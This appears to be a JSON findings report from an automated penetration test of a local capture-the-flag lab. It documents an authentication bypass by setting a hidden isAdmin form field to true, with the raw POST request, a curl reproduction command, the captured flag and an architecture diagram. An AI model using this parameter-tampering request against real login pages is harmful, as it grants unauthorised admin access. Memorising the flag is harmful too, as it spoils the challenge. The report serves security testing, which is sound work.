@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:21:26.175359+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "8304355f-9f46-4d2c-ba15-69dfbd2577e7",
+      "timestamp": "2026-04-12T21:21:26.175214+00:00",
+      "title": "Authentication Bypass via Hidden Parameter Tampering (isAdmin)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58043/index.php",
+      "description": "The login form contains a hidden HTML field `<input type=\"hidden\" name=\"isAdmin\" value=\"false\" />`. The server-side PHP code trusts this client-supplied parameter to determine admin access. By changing the field value from `false` to `true` in a POST request (any username/password), an attacker completely bypasses authentication and gains admin access, including the CTF flag.",
+      "evidence": "POST /index.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin&isAdmin=true\n\nResponse body contained:\n<h2>Welcome Admin</h2>\n<h3>Congratulations, here is the flag: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}</h3>\n\nFLAG: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X POST http://172.17.0.1:58043/index.php -d 'username=admin&password=anything&isAdmin=true'",
+        "expected": "Welcome Admin + flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "170f1466-7adf-4826-ab98-c992da655eba",
+      "timestamp": "2026-04-12T21:21:39.525785+00:00",
+      "title": "AUTH 01 Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Client)\"] -->|\"POST /index.php username+password+isAdmin\"| Apache[\"Apache 2.4.25 + PHP 5.6.40\"]\n  Apache -->|\"if isAdmin==true: grant access\"| Flag[\"Flag Disclosed: flag{1d0287b6-...}\"]\n  Apache -->|\"if isAdmin==false: show login form\"| LoginForm[\"Login Form /index.php\"]\n  LoginForm -->|\"hidden field isAdmin=false\"| Browser"
+    }
+  ]
+}
